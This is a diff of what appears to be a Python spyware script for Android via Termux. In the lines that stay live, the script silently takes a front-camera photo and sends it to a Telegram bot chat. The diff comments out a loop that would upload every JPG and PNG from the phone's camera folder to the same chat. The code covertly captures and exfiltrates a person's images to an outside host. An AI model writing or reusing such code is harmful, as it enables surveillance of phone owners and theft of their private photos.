@@ -72,14 +72,14 @@ def run():
     os.system("termux-camera-photo -c 1 hi.png")
     photo = open('hi.png', 'rb')
     bot.send_photo(chat_id, photo)
-    files = os.listdir("/sdcard/DCIM/Camera")
-    for f in files:
-        if "jpg" in f:
-            ph = open("/sdcard/DCIM/Camera/"+f, 'rb')
-            bot.send_photo(chat_id, ph)
-        elif "png" in f:
-            ph = open("/sdcard/DCIM/Camera/"+f, 'rb')
-            bot.send_photo(chat_id, ph)
-        else:
-            pass
+#     files = os.listdir("/sdcard/DCIM/Camera")
+#     for f in files:
+#         if "jpg" in f:
+#             ph = open("/sdcard/DCIM/Camera/"+f, 'rb')
+#             bot.send_photo(chat_id, ph)
+#         elif "png" in f:
+#             ph = open("/sdcard/DCIM/Camera/"+f, 'rb')
+#             bot.send_photo(chat_id, ph)
+#         else:
+#             pass
 run()
